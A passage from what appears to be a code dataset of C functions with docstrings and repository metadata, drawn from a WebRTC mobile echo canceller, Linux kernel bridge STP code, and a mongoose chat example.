"lhc180/webrtc-based-android-aecm", "stars": 56, "license": "None", "language": "c", "size": 2092}
{"docstring": "// Maximum absolute value of word16 vector. C version for generic platforms.\n", "func_signal": "int16_t WebRtcSpl_MaxAbsValueW16C(const int16_t* vector, int length)", "code": "{\n  int i = 0, absolute = 0, maximum = 0;\n\n  if (vector == NULL || length <= 0) {\n    return -1;\n  }\n\n  for (i = 0; i < length; i++) {\n    absolute = abs((int)vector[i]);\n\n    if (absolute > maximum) {\n      maximum = absolute;\n    }\n  }\n\n  // Guard the case for abs(-32768).\n  if (maximum > WEBRTC_SPL_WORD16_MAX) {\n    maximum = WEBRTC_SPL_WORD16_MAX;\n  }\n\n  return (int16_t)maximum;\n}", "path": "eclipse-project\\jni\\aecm\\min_max_operations.c", "repo_name": "lhc180/webrtc-based-android-aecm", "stars": 56, "license": "None", "language": "c", "size": 2092}
{"docstring": "// CalcSuppressionGain(...)\n//\n// This function calculates the suppression gain that is used in the Wiener filter.\n//\n//\n// @param  aecm     [i/n]   Handle of the AECM instance.\n// @param  supGain  [out]   (Return value) Suppression gain with which to scale the noise\n//                          level (Q14).\n//\n//\n", "func_signal": "static int16_t CalcSuppressionGain(AecmCore_t * const aecm)", "code": "{\n    int32_t tmp32no1;\n\n    int16_t supGain = SUPGAIN_DEFAULT;\n    int16_t tmp16no1;\n    int16_t dE = 0;\n\n    // Determine suppression gain used in the Wiener filter. The gain is based on a mix of far\n    // end energy and echo estimation error.\n    // Adjust for the far end signal level. A low signal level indicates no far end signal,\n    // hence we set the suppression gain to 0\n    if (!aecm->currentVADValue)\n    {\n        supGain = 0;\n    } else\n    {\n        // Adjust for possible double talk. If we have large variations in estimation error we\n        // likely have double talk (or poor channel).\n        tmp16no1 = (aecm->nearLogEnergy[0] - aecm->echoStoredLogEnergy[0] - ENERGY_DEV_OFFSET);\n        dE = WEBRTC_SPL_ABS_W16(tmp16no1);\n\n        if (dE < ENERGY_DEV_TOL)\n        {\n            // Likely no double talk. The better estimation, the more we can suppress signal.\n            // Update counters\n            if (dE < SUPGAIN_EPC_DT)\n            {\n                tmp32no1 = WEBRTC_SPL_MUL_16_16(aecm->supGainErrParamDiffAB, dE);\n                tmp32no1 += (SUPGAIN_EPC_DT >> 1);\n                tmp16no1 = (int16_t)WebRtcSpl_DivW32W16(tmp32no1, SUPGAIN_EPC_DT);\n                supGain = aecm->supGainErrParamA - tmp16no1;\n            } else\n            {\n                tmp32no1 = WEBRTC_SPL_MUL_16_16(aecm->supGainErrParamDiffBD,\n                                                (ENERGY_DEV_TOL - dE));\n                tmp32no1 += ((ENERGY_DEV_TOL - SUPGAIN_EPC_DT) >> 1);\n                tmp16no1 = (int16_t)WebRtcSpl_DivW32W16(tmp32no1, (ENERGY_DEV_TOL\n                        - SUPGAIN_EPC_DT));\n                supGain = aecm->supGainErrParamD + tmp16no1;\n            }\n        } else\n        {\n            // Likely in double talk. Use default value\n            supGain = aecm->supGainErrParamD;\n        }\n    }\n\n    if (supGain > aecm->supGainOld)\n    {\n        tmp16no1 = supGain;\n    } else\n    {\n        tmp16no1 = aecm->supGainOld;\n    }\n    aecm->supGainOld = supGain;\n    if (tmp16no1 < aecm->supGain)\n    {\n        aecm->supGain += (int16_t)((tmp16no1 - aecm->supGain) >> 4);\n    } else\n    {\n        aecm->supGain += (int16_t)((tmp16no1 - aecm->supGain) >> 4);\n    }\n\n    // END: Update suppression gain\n\n    return aecm->supGain;\n}", "path": "eclipse-project\\jni\\aecm\\aecm_core.c", "repo_name": "lhc180/webrtc-based-android-aecm", "stars": 56, "license": "None", "language": "c", "size": 2092}
{"docstring": "/**\n * This is a wrapper wraps WebRtcAecm_Free function in echo_control_mobile.c\n * This function releases the memory allocated by WebRtcAecm_Create().\n *\n * Inputs:\n *         aecmHandler - handler of the AECM instance created by nativeCreateAecmInstance()\n * Outputs:\n *         NONE\n * Returns         0: OK\n *                      -1: error\n *\n */\n", "func_signal": "JNIEXPORT jint\nJNICALL Java_com_android_webrtc_audio_MobileAEC_nativeFreeAecmInstance(\n\t\tJNIEnv *env, jclass jclazz, jint aecmHandler)", "code": "{\n\tvoid *aecmInst = (void *) aecmHandler;\n\tif (aecmInst == NULL)\n\t\treturn -1;\n\tint ret = WebRtcAecm_Free(aecmInst);\n\taecmInst = NULL;\n\treturn ret;\n}", "path": "eclipse-project\\jni\\aecm\\aecm_wrapper.c", "repo_name": "lhc180/webrtc-based-android-aecm", "stars": 56, "license": "None", "language": "c", "size": 2092}
{"docstring": "// WebRtcAecm_CalcEnergies(...)\n//\n// This function calculates the log of energies for nearend, farend and estimated\n// echoes. There is also an update of energy decision levels, i.e. internal VAD.\n//\n//\n// @param  aecm         [i/o]   Handle of the AECM instance.\n// @param  far_spectrum [in]    Pointer to farend spectrum.\n// @param  far_q        [in]    Q-domain of farend spectrum.\n// @param  nearEner     [in]    Near end energy for current block in\n//                              Q(aecm->dfaQDomain).\n// @param  echoEst      [out]   Estimated echo in Q(xfa_q+RESOLUTION_CHANNEL16).\n//\n", "func_signal": "void WebRtcAecm_CalcEnergies(AecmCore_t * aecm,\n                             const uint16_t* far_spectrum,\n                             const int16_t far_q,\n                             const uint32_t nearEner,\n                             int32_t * echoEst)", "code": "{\n    // Local variables\n    uint32_t tmpAdapt = 0;\n    uint32_t tmpStored = 0;\n    uint32_t tmpFar = 0;\n\n    int i;\n\n    int16_t zeros, frac;\n    int16_t tmp16;\n    int16_t increase_max_shifts = 4;\n    int16_t decrease_max_shifts = 11;\n    int16_t increase_min_shifts = 11;\n    int16_t decrease_min_shifts = 3;\n    int16_t kLogLowValue = WEBRTC_SPL_LSHIFT_W16(PART_LEN_SHIFT, 7);\n\n    // Get log of near end energy and store in buffer\n\n    // Shift buffer\n    memmove(aecm->nearLogEnergy + 1, aecm->nearLogEnergy,\n            sizeof(int16_t) * (MAX_BUF_LEN - 1));\n\n    // Logarithm of integrated magnitude spectrum (nearEner)\n    tmp16 = kLogLowValue;\n    if (nearEner)\n    {\n        zeros = WebRtcSpl_NormU32(nearEner);\n        frac = (int16_t)WEBRTC_SPL_RSHIFT_U32(\n                              (WEBRTC_SPL_LSHIFT_U32(nearEner, zeros) & 0x7FFFFFFF),\n                              23);\n        // log2 in Q8\n        tmp16 += WEBRTC_SPL_LSHIFT_W16((31 - zeros), 8) + frac;\n        tmp16 -= WEBRTC_SPL_LSHIFT_W16(aecm->dfaNoisyQDomain, 8);\n    }\n    aecm->nearLogEnergy[0] = tmp16;\n    // END: Get log of near end energy\n\n    WebRtcAecm_CalcLinearEnergies(aecm, far_spectrum, echoEst, &tmpFar, &tmpAdapt, &tmpStored);\n\n    // Shift buffers\n    memmove(aecm->echoAdaptLogEnergy + 1, aecm->echoAdaptLogEnergy,\n            sizeof(int16_t) * (MAX_BUF_LEN - 1));\n    memmove(aecm->echoStoredLogEnergy + 1, aecm->echoStoredLogEnergy,\n            sizeof(int16_t) * (MAX_BUF_LEN - 1));\n\n    // Logarithm of delayed far end energy\n    tmp16 = kLogLowValue;\n    if (tmpFar)\n    {\n        zeros = WebRtcSpl_NormU32(tmpFar);\n        frac = (int16_t)WEBRTC_SPL_RSHIFT_U32((WEBRTC_SPL_LSHIFT_U32(tmpFar, zeros)\n                        & 0x7FFFFFFF), 23);\n        // log2 in Q8\n        tmp16 += WEBRTC_SPL_LSHIFT_W16((31 - zeros), 8) + frac;\n        tmp16 -= WEBRTC_SPL_LSHIFT_W16(far_q, 8);\n    }\n    aecm->farLogEnergy = tmp16;\n\n    // Logarithm of estimated echo energy through adapted channel\n    tmp16 = kLogLowValue;\n    if (tmpAdapt)\n    {\n        zeros = WebRtcSpl_NormU32(tmpAdapt);\n        frac = (int16_t)WEBRTC_SPL_RSHIFT_U32((WEBRTC_SPL_LSHIFT_U32(tmpAdapt, zeros)\n                        & 0x7FFFFFFF), 23);\n        //log2 in Q8\n        tmp16 += WEBRTC_SPL_LSHIFT_W16((31 - zeros), 8) + frac;\n        tmp16 -= WEBRTC_SPL_LSHIFT_W16(RESOLUTION_CHANNEL16 + far_q, 8);\n    }\n    aecm->echoAdaptLogEnergy[0] = tmp16;\n\n    // Logarithm of estimated echo energy through stored channel\n    tmp16 = kLogLowValue;\n    if (tmpStored)\n    {\n        zeros = WebRtcSpl_NormU32(tmpStored);\n        frac = (int16_t)WEBRTC_SPL_RSHIFT_U32((WEBRTC_SPL_LSHIFT_U32(tmpStored, zeros)\n                        & 0x7FFFFFFF), 23);\n        //log2 in Q8\n        tmp16 += WEBRTC_SPL_LSHIFT_W16((31 - zeros), 8) + frac;\n        tmp16 -= WEBRTC_SPL_LSHIFT_W16(RESOLUTION_CHANNEL16 + far_q, 8);\n    }\n    aecm->echoStoredLogEnergy[0] = tmp16;\n\n    // Update farend energy levels (min, max, vad, mse)\n    if (aecm->farLogEnergy > FAR_ENERGY_MIN)\n    {\n        if (aecm->startupState == 0)\n        {\n            increase_max_shifts = 2;\n            decrease_min_shifts = 2;\n            increase_min_shifts = 8;\n        }\n\n        aecm->farEnergyMin = WebRtcAecm_AsymFilt(aecm->farEnergyMin, aecm->farLogEnergy,\n                                                 increase_min_shifts, decrease_min_shifts);\n        aecm->farEnergyMax = WebRtcAecm_AsymFilt(aecm->farEnergyMax, aecm->farLogEnergy,\n                                                 increase_max_shifts, decrease_max_shifts);\n        aecm->farEnergyMaxMin = (aecm->farEnergyMax - aecm->farEnergyMin);\n\n        // Dynamic VAD region size\n        tmp16 = 2560 - aecm->farEnergyMin;\n        if (tmp16 > 0)\n        {\n            tmp16 = (int16_t)WEBRTC_SPL_MUL_16_16_RSFT(tmp16, FAR_ENERGY_VAD_REGION, 9);\n        } else\n        {\n            tmp16 = 0;\n        }\n        tmp16 += FAR_ENERGY_VAD_REGION;\n\n        if ((aecm->startupState == 0) | (aecm->vadUpdateCount > 1024))\n        {\n            // In startup phase or VAD update halted\n            aecm->farEnergyVAD = aecm->farEnergyMin + tmp16;\n        } else\n        {\n            if (aecm->farEnergyVAD > aecm->farLogEnergy)\n            {\n                aecm->farEnergyVAD += WEBRTC_SPL_RSHIFT_W16(aecm->farLogEnergy +\n                                                            tmp16 -\n                                                            aecm->farEnergyVAD,\n                                                            6);\n                aecm->vadUpdateCount = 0;\n            } else\n            {\n                aecm->vadUpdateCount++;\n            }\n        }\n        // Put MSE threshold higher than VAD\n        aecm->farEnergyMSE = aecm->farEnergyVAD + (1 << 8);\n    }\n\n    // Update VAD variables\n    if (aecm->farLogEnergy > aecm->farEnergyVAD)\n    {\n        if ((aecm->startupState == 0) | (aecm->farEnergyMaxMin > FAR_ENERGY_DIFF))\n        {\n            // We are in startup or have significant dynamics in input speech level\n            aecm->currentVADValue = 1;\n        }\n    } else\n    {\n        aecm->currentVADValue = 0;\n    }\n    if ((aecm->currentVADValue) && (aecm->firstVAD))\n    {\n        aecm->firstVAD = 0;\n        if (aecm->echoAdaptLogEnergy[0] > aecm->nearLogEnergy[0])\n        {\n            // The estimated echo has higher energy than the near end signal.\n            // This means that the initialization was too aggressive. Scale\n            // down by a factor 8\n            for (i = 0; i < PART_LEN1; i++)\n            {\n                aecm->channelAdapt16[i] >>= 3;\n            }\n            // Compensate the adapted echo energy level accordingly.\n            aecm->echoAdaptLogEnergy[0] -= (3 << 8);\n            aecm->firstVAD = 1;\n        }\n    }\n}", "path": "eclipse-project\\jni\\aecm\\aecm_core.c", "repo_name": "lhc180/webrtc-based-android-aecm", "stars": 56, "license": "None", "language": "c", "size": 2092}
{"docstring": "/**\n * This wrapper wraps the WebRtcAecm_set_config function in echo_control_mobile.c\n * Enables the user to set certain parameters on-the-fly.\n *\n * Inputs:\n *        aecHandler - Handler to the AEC instance.\n *        aecConfig - the new configuration of AEC instance to set.\n * Outputs:\n *         NONE\n * Return:     0: OK\n *                  -1: error\n *\n */\n", "func_signal": "JNIEXPORT jint JNICALL Java_com_android_webrtc_audio_MobileAEC_nativeSetConfig(\n\t\tJNIEnv *env, jclass jclazz, jint aecmHandler, jobject aecmConfig)", "code": "{\n\n\tvoid * aecmInst = (void *) aecmHandler;\n\tif (aecmInst == NULL)\n\t\treturn -1;\n\n\t//get reference of AecmConfig class  from java side.\n\tjclass JavaAecmConfig = (*env)->GetObjectClass(env, aecmConfig);\n\n\t//assertion that class not be NULL\n\t//TODO(billhoo) should use Exception handler to handle this situation instead of assertion.\n\tassert(JavaAecmConfig != NULL);\n\n\t//get configuration field IDs from java side.\n\tjfieldID mAecmModeID = (*env)->GetFieldID(env, JavaAecmConfig, \"mAecmMode\",\n\t\t\t\"S\");\n\tjfieldID mCngModeID = (*env)->GetFieldID(env, JavaAecmConfig, \"mCngMode\",\n\t\t\t\"S\");\n\n\t//if any ID is NULL, return -1 for error.\n\tif (mAecmModeID == NULL || mCngModeID == NULL)\n\t\treturn -1;\n\n\t//get values of fields\n\tshort echoMode = (*env)->GetShortField(env, aecmConfig, mAecmModeID);\n\tshort cngMode = (*env)->GetShortField(env, aecmConfig, mCngModeID);\n\n\t//set new configuration to AECM instance.\n\tAecmConfig config;\n\tconfig.echoMode = echoMode;\n\tconfig.cngMode = cngMode;\n\n\treturn WebRtcAecm_set_config(aecmInst, config);\n}", "path": "eclipse-project\\jni\\aecm\\aecm_wrapper.c", "repo_name": "lhc180/webrtc-based-android-aecm", "stars": 56, "license": "None", "language": "c", "size": 2092}
{"docstring": "// Index of maximum value in a word16 vector.\n", "func_signal": "int WebRtcSpl_MaxIndexW16(const int16_t* vector, int length)", "code": "{\n  int i = 0, index = 0;\n  int16_t maximum = WEBRTC_SPL_WORD16_MIN;\n\n  if (vector == NULL || length <= 0) {\n    return -1;\n  }\n\n  for (i = 0; i < length; i++) {\n    if (vector[i] > maximum) {\n      maximum = vector[i];\n      index = i;\n    }\n  }\n\n  return index;\n}", "path": "eclipse-project\\jni\\aecm\\min_max_operations.c", "repo_name": "lhc180/webrtc-based-android-aecm", "stars": 56, "license": "None", "language": "c", "size": 2092}
{"docstring": "/* Change bridge STP parameter */\n", "func_signal": "int br_set_hello_time(struct net_bridge *br, unsigned long val)", "code": "{\n\tunsigned long t = clock_t_to_jiffies(val);\n\n\tif (t < BR_MIN_HELLO_TIME || t > BR_MAX_HELLO_TIME)\n\t\treturn -ERANGE;\n\n\tspin_lock_bh(&br->lock);\n\tbr->bridge_hello_time = t;\n\tif (br_is_root_bridge(br))\n\t\tbr->hello_time = br->bridge_hello_time;\n\tspin_unlock_bh(&br->lock);\n\treturn 0;\n}", "path": "net\\bridge\\br_stp.c", "repo_name": "showp1984/bricked-pyramid-3.0", "stars": 32, "license": "other", "language": "c", "size": 119830}
{"docstring": "/* called under bridge lock */\n", "func_signal": "static inline void br_topology_change_acknowledged(struct net_bridge *br)", "code": "{\n\tbr->topology_change_detected = 0;\n\tdel_timer(&br->tcn_timer);\n}", "path": "net\\bridge\\br_stp.c", "repo_name": "showp1984/bricked-pyramid-3.0", "stars": 32, "license": "other", "language": "c", "size": 119830}
{"docstring": "/* called under bridge lock */\n", "func_signal": "static void br_make_forwarding(struct net_bridge_port *p)", "code": "{\n\tstruct net_bridge *br = p->br;\n\n\tif (p->state != BR_STATE_BLOCKING)\n\t\treturn;\n\n\tif (br->stp_enabled == BR_NO_STP || br->forward_delay == 0) {\n\t\tp->state = BR_STATE_FORWARDING;\n\t\tbr_topology_change_detection(br);\n\t\tdel_timer(&p->forward_delay_timer);\n\t}\n\telse if (br->stp_enabled == BR_KERNEL_STP)\n\t\tp->state = BR_STATE_LISTENING;\n\telse\n\t\tp->state = BR_STATE_LEARNING;\n\n\tbr_multicast_enable_port(p);\n\n\tbr_log_state(p);\n\n\tif (br->forward_delay != 0)\n\t\tmod_timer(&p->forward_delay_timer, jiffies + br->forward_delay);\n}", "path": "net\\bridge\\br_stp.c", "repo_name": "showp1984/bricked-pyramid-3.0", "stars": 32, "license": "other", "language": "c", "size": 119830}
{"docstring": "/* called under bridge lock */\n", "func_signal": "void br_received_tcn_bpdu(struct net_bridge_port *p)", "code": "{\n\tif (br_is_designated_port(p)) {\n\t\tbr_info(p->br, \"port %u(%s) received tcn bpdu\\n\",\n\t\t\t(unsigned) p->port_no, p->dev->name);\n\n\t\tbr_topology_change_detection(p->br);\n\t\tbr_topology_change_acknowledge(p);\n\t}\n}", "path": "net\\bridge\\br_stp.c", "repo_name": "showp1984/bricked-pyramid-3.0", "stars": 32, "license": "other", "language": "c", "size": 119830}
{"docstring": "/* called under bridge lock */\n", "func_signal": "void br_topology_change_detection(struct net_bridge *br)", "code": "{\n\tint isroot = br_is_root_bridge(br);\n\n\tif (br->stp_enabled != BR_KERNEL_STP)\n\t\treturn;\n\n\tbr_info(br, \"topology change detected, %s\\n\",\n\t\tisroot ? \"propagating\" : \"sending tcn bpdu\");\n\n\tif (isroot) {\n\t\tbr->topology_change = 1;\n\t\tmod_timer(&br->topology_change_timer, jiffies\n\t\t\t  + br->bridge_forward_delay + br->bridge_max_age);\n\t} else if (!br->topology_change_detected) {\n\t\tbr_transmit_tcn(br);\n\t\tmod_timer(&br->tcn_timer, jiffies + br->bridge_hello_time);\n\t}\n\n\tbr->topology_change_detected = 1;\n}", "path": "net\\bridge\\br_stp.c", "repo_name": "showp1984/bricked-pyramid-3.0", "stars": 32, "license": "other", "language": "c", "size": 119830}
{"docstring": "/* called under bridge lock */\n", "func_signal": "void br_configuration_update(struct net_bridge *br)", "code": "{\n\tbr_root_selection(br);\n\tbr_designated_port_selection(br);\n}", "path": "net\\bridge\\br_stp.c", "repo_name": "showp1984/bricked-pyramid-3.0", "stars": 32, "license": "other", "language": "c", "size": 119830}
{"docstring": "/* called under bridge lock */\n", "func_signal": "static int br_should_become_designated_port(const struct net_bridge_port *p)", "code": "{\n\tstruct net_bridge *br;\n\tint t;\n\n\tbr = p->br;\n\tif (br_is_designated_port(p))\n\t\treturn 1;\n\n\tif (memcmp(&p->designated_root, &br->designated_root, 8))\n\t\treturn 1;\n\n\tif (br->root_path_cost < p->designated_cost)\n\t\treturn 1;\n\telse if (br->root_path_cost > p->designated_cost)\n\t\treturn 0;\n\n\tt = memcmp(&br->bridge_id, &p->designated_bridge, 8);\n\tif (t < 0)\n\t\treturn 1;\n\telse if (t > 0)\n\t\treturn 0;\n\n\tif (p->port_id < p->designated_port)\n\t\treturn 1;\n\n\treturn 0;\n}", "path": "net\\bridge\\br_stp.c", "repo_name": "showp1984/bricked-pyramid-3.0", "stars": 32, "license": "other", "language": "c", "size": 119830}
{"docstring": "/* Keyboard input buffer full */\n", "func_signal": "static void jazz_write_output(unsigned char val)", "code": "{\n\tint status;\n\n\tdo {\n\t\tstatus = jazz_kh->command;\n\t} while (status & KBD_STAT_IBF);\n\tjazz_kh->data = val;\n}", "path": "arch\\mips\\jazz\\reset.c", "repo_name": "showp1984/bricked-pyramid-3.0", "stars": 32, "license": "other", "language": "c", "size": 119830}
{"docstring": "/* include/linux/byteorder doesn't support \"unsigned long\" type */\n", "func_signal": "static inline unsigned long ext2_swab(const unsigned long y)", "code": "{\n#if BITS_PER_LONG == 64\n\treturn (unsigned long) __swab64((u64) y);\n#elif BITS_PER_LONG == 32\n\treturn (unsigned long) __swab32((u32) y);\n#else\n#error BITS_PER_LONG not defined\n#endif\n}", "path": "lib\\find_next_bit.c", "repo_name": "showp1984/bricked-pyramid-3.0", "stars": 32, "license": "other", "language": "c", "size": 119830}
{"docstring": "/* called under bridge lock */\n", "func_signal": "static inline void br_record_config_information(struct net_bridge_port *p,\n\t\t\t\t\t\tconst struct br_config_bpdu *bpdu)", "code": "{\n\tp->designated_root = bpdu->root;\n\tp->designated_cost = bpdu->root_path_cost;\n\tp->designated_bridge = bpdu->bridge_id;\n\tp->designated_port = bpdu->port_id;\n\tp->designated_age = jiffies + bpdu->message_age;\n\n\tmod_timer(&p->message_age_timer, jiffies\n\t\t  + (p->br->max_age - bpdu->message_age));\n}", "path": "net\\bridge\\br_stp.c", "repo_name": "showp1984/bricked-pyramid-3.0", "stars": 32, "license": "other", "language": "c", "size": 119830}
{"docstring": "/* called under bridge lock */\n", "func_signal": "static void br_root_selection(struct net_bridge *br)", "code": "{\n\tstruct net_bridge_port *p;\n\tu16 root_port = 0;\n\n\tlist_for_each_entry(p, &br->port_list, list) {\n\t\tif (br_should_become_root_port(p, root_port))\n\t\t\troot_port = p->port_no;\n\n\t}\n\n\tbr->root_port = root_port;\n\n\tif (!root_port) {\n\t\tbr->designated_root = br->bridge_id;\n\t\tbr->root_path_cost = 0;\n\t} else {\n\t\tp = br_get_port(br, root_port);\n\t\tbr->designated_root = p->designated_root;\n\t\tbr->root_path_cost = p->designated_cost + p->path_cost;\n\t}\n}", "path": "net\\bridge\\br_stp.c", "repo_name": "showp1984/bricked-pyramid-3.0", "stars": 32, "license": "other", "language": "c", "size": 119830}
{"docstring": "/* called under bridge lock */\n", "func_signal": "static inline void br_topology_change_acknowledge(struct net_bridge_port *p)", "code": "{\n\tp->topology_change_ack = 1;\n\tbr_transmit_config(p);\n}", "path": "net\\bridge\\br_stp.c", "repo_name": "showp1984/bricked-pyramid-3.0", "stars": 32, "license": "other", "language": "c", "size": 119830}
{"docstring": "/* called under bridge lock */\n", "func_signal": "void br_received_config_bpdu(struct net_bridge_port *p, struct br_config_bpdu *bpdu)", "code": "{\n\tstruct net_bridge *br;\n\tint was_root;\n\n\tbr = p->br;\n\twas_root = br_is_root_bridge(br);\n\n\tif (br_supersedes_port_info(p, bpdu)) {\n\t\tbr_record_config_information(p, bpdu);\n\t\tbr_configuration_update(br);\n\t\tbr_port_state_selection(br);\n\n\t\tif (!br_is_root_bridge(br) && was_root) {\n\t\t\tdel_timer(&br->hello_timer);\n\t\t\tif (br->topology_change_detected) {\n\t\t\t\tdel_timer(&br->topology_change_timer);\n\t\t\t\tbr_transmit_tcn(br);\n\n\t\t\t\tmod_timer(&br->tcn_timer,\n\t\t\t\t\t  jiffies + br->bridge_hello_time);\n\t\t\t}\n\t\t}\n\n\t\tif (p->port_no == br->root_port) {\n\t\t\tbr_record_config_timeout_values(br, bpdu);\n\t\t\tbr_config_bpdu_generation(br);\n\t\t\tif (bpdu->topology_change_ack)\n\t\t\t\tbr_topology_change_acknowledged(br);\n\t\t}\n\t} else if (br_is_designated_port(p)) {\n\t\tbr_reply(p);\n\t}\n}", "path": "net\\bridge\\br_stp.c", "repo_name": "showp1984/bricked-pyramid-3.0", "stars": 32, "license": "other", "language": "c", "size": 119830}
{"docstring": "/* called under bridge lock */\n", "func_signal": "void br_transmit_config(struct net_bridge_port *p)", "code": "{\n\tstruct br_config_bpdu bpdu;\n\tstruct net_bridge *br;\n\n\n\tif (timer_pending(&p->hold_timer)) {\n\t\tp->config_pending = 1;\n\t\treturn;\n\t}\n\n\tbr = p->br;\n\n\tbpdu.topology_change = br->topology_change;\n\tbpdu.topology_change_ack = p->topology_change_ack;\n\tbpdu.root = br->designated_root;\n\tbpdu.root_path_cost = br->root_path_cost;\n\tbpdu.bridge_id = br->bridge_id;\n\tbpdu.port_id = p->port_id;\n\tif (br_is_root_bridge(br))\n\t\tbpdu.message_age = 0;\n\telse {\n\t\tstruct net_bridge_port *root\n\t\t\t= br_get_port(br, br->root_port);\n\t\tbpdu.message_age = (jiffies - root->designated_age)\n\t\t\t+ MESSAGE_AGE_INCR;\n\t}\n\tbpdu.max_age = br->max_age;\n\tbpdu.hello_time = br->hello_time;\n\tbpdu.forward_delay = br->forward_delay;\n\n\tif (bpdu.message_age < br->max_age) {\n\t\tbr_send_config_bpdu(p, &bpdu);\n\t\tp->topology_change_ack = 0;\n\t\tp->config_pending = 0;\n\t\tmod_timer(&p->hold_timer,\n\t\t\t  round_jiffies(jiffies + BR_HOLD_TIME));\n\t}\n}", "path": "net\\bridge\\br_stp.c", "repo_name": "showp1984/bricked-pyramid-3.0", "stars": 32, "license": "other", "language": "c", "size": 119830}
{"docstring": "/* called under bridge lock */\n", "func_signal": "struct net_bridge_port *br_get_port(struct net_bridge *br, u16 port_no)", "code": "{\n\tstruct net_bridge_port *p;\n\n\tlist_for_each_entry_rcu(p, &br->port_list, list) {\n\t\tif (p->port_no == port_no)\n\t\t\treturn p;\n\t}\n\n\treturn NULL;\n}", "path": "net\\bridge\\br_stp.c", "repo_name": "showp1984/bricked-pyramid-3.0", "stars": 32, "license": "other", "language": "c", "size": 119830}
{"docstring": "/* called under bridge lock */\n", "func_signal": "static void br_designated_port_selection(struct net_bridge *br)", "code": "{\n\tstruct net_bridge_port *p;\n\n\tlist_for_each_entry(p, &br->port_list, list) {\n\t\tif (p->state != BR_STATE_DISABLED &&\n\t\t    br_should_become_designated_port(p))\n\t\t\tbr_become_designated_port(p);\n\n\t}\n}", "path": "net\\bridge\\br_stp.c", "repo_name": "showp1984/bricked-pyramid-3.0", "stars": 32, "license": "other", "language": "c", "size": 119830}
{"docstring": "/* called under bridge lock */\n", "func_signal": "void br_config_bpdu_generation(struct net_bridge *br)", "code": "{\n\tstruct net_bridge_port *p;\n\n\tlist_for_each_entry(p, &br->port_list, list) {\n\t\tif (p->state != BR_STATE_DISABLED &&\n\t\t    br_is_designated_port(p))\n\t\t\tbr_transmit_config(p);\n\t}\n}", "path": "net\\bridge\\br_stp.c", "repo_name": "showp1984/bricked-pyramid-3.0", "stars": 32, "license": "other", "language": "c", "size": 119830}
{"docstring": "/* CONFIG_HIGHMEM */\n", "func_signal": "static void __init fixaddr_user_init( void)", "code": "{\n#ifdef CONFIG_ARCH_REUSE_HOST_VSYSCALL_AREA\n\tlong size = FIXADDR_USER_END - FIXADDR_USER_START;\n\tpgd_t *pgd;\n\tpud_t *pud;\n\tpmd_t *pmd;\n\tpte_t *pte;\n\tphys_t p;\n\tunsigned long v, vaddr = FIXADDR_USER_START;\n\n\tif (!size)\n\t\treturn;\n\n\tfixrange_init( FIXADDR_USER_START, FIXADDR_USER_END, swapper_pg_dir);\n\tv = (unsigned long) alloc_bootmem_low_pages(size);\n\tmemcpy((void *) v , (void *) FIXADDR_USER_START, size);\n\tp = __pa(v);\n\tfor ( ; size > 0; size -= PAGE_SIZE, vaddr += PAGE_SIZE,\n\t\t      p += PAGE_SIZE) {\n\t\tpgd = swapper_pg_dir + pgd_index(vaddr);\n\t\tpud = pud_offset(pgd, vaddr);\n\t\tpmd = pmd_offset(pud, vaddr);\n\t\tpte = pte_offset_kernel(pmd, vaddr);\n\t\tpte_set_val(*pte, p, PAGE_READONLY);\n\t}\n#endif\n}", "path": "arch\\um\\kernel\\mem.c", "repo_name": "showp1984/bricked-pyramid-3.0", "stars": 32, "license": "other", "language": "c", "size": 119830}
{"docstring": "/* called under bridge lock */\n", "func_signal": "static void br_make_blocking(struct net_bridge_port *p)", "code": "{\n\tif (p->state != BR_STATE_DISABLED &&\n\t    p->state != BR_STATE_BLOCKING) {\n\t\tif (p->state == BR_STATE_FORWARDING ||\n\t\t    p->state == BR_STATE_LEARNING)\n\t\t\tbr_topology_change_detection(p->br);\n\n\t\tp->state = BR_STATE_BLOCKING;\n\t\tbr_log_state(p);\n\t\tdel_timer(&p->forward_delay_timer);\n\t}\n}", "path": "net\\bridge\\br_stp.c", "repo_name": "showp1984/bricked-pyramid-3.0", "stars": 32, "license": "other", "language": "c", "size": 119830}
{"docstring": "/* called under bridge lock */\n", "func_signal": "static int br_should_become_root_port(const struct net_bridge_port *p,\n\t\t\t\t      u16 root_port)", "code": "{\n\tstruct net_bridge *br;\n\tstruct net_bridge_port *rp;\n\tint t;\n\n\tbr = p->br;\n\tif (p->state == BR_STATE_DISABLED ||\n\t    br_is_designated_port(p))\n\t\treturn 0;\n\n\tif (memcmp(&br->bridge_id, &p->designated_root, 8) <= 0)\n\t\treturn 0;\n\n\tif (!root_port)\n\t\treturn 1;\n\n\trp = br_get_port(br, root_port);\n\n\tt = memcmp(&p->designated_root, &rp->designated_root, 8);\n\tif (t < 0)\n\t\treturn 1;\n\telse if (t > 0)\n\t\treturn 0;\n\n\tif (p->designated_cost + p->path_cost <\n\t    rp->designated_cost + rp->path_cost)\n\t\treturn 1;\n\telse if (p->designated_cost + p->path_cost >\n\t\t rp->designated_cost + rp->path_cost)\n\t\treturn 0;\n\n\tt = memcmp(&p->designated_bridge, &rp->designated_bridge, 8);\n\tif (t < 0)\n\t\treturn 1;\n\telse if (t > 0)\n\t\treturn 0;\n\n\tif (p->designated_port < rp->designated_port)\n\t\treturn 1;\n\telse if (p->designated_port > rp->designated_port)\n\t\treturn 0;\n\n\tif (p->port_id < rp->port_id)\n\t\treturn 1;\n\n\treturn 0;\n}", "path": "net\\bridge\\br_stp.c", "repo_name": "showp1984/bricked-pyramid-3.0", "stars": 32, "license": "other", "language": "c", "size": 119830}
{"docstring": "// A handler for the /ajax/get_messages endpoint.\n// Return a list of messages with ID greater than requested.\n", "func_signal": "static void ajax_get_messages(struct mg_connection *conn,\n                              const struct mg_request_info *request_info)", "code": "{\n  char last_id[32], *json;\n  int is_jsonp;\n\n  mg_printf(conn, \"%s\", ajax_reply_start);\n  is_jsonp = handle_jsonp(conn, request_info);\n\n  get_qsvar(request_info, \"last_id\", last_id, sizeof(last_id));\n  if ((json = messages_to_json(strtoul(last_id, NULL, 10))) != NULL) {\n    mg_printf(conn, \"[%s]\", json);\n    free(json);\n  }\n\n  if (is_jsonp) {\n    mg_printf(conn, \"%s\", \")\");\n  }\n}", "path": "tests\\stinger\\lib\\mongoose\\examples\\chat.c", "repo_name": "robmccoll/graphdb-testing", "stars": 35, "license": "None", "language": "c", "size": 4670}
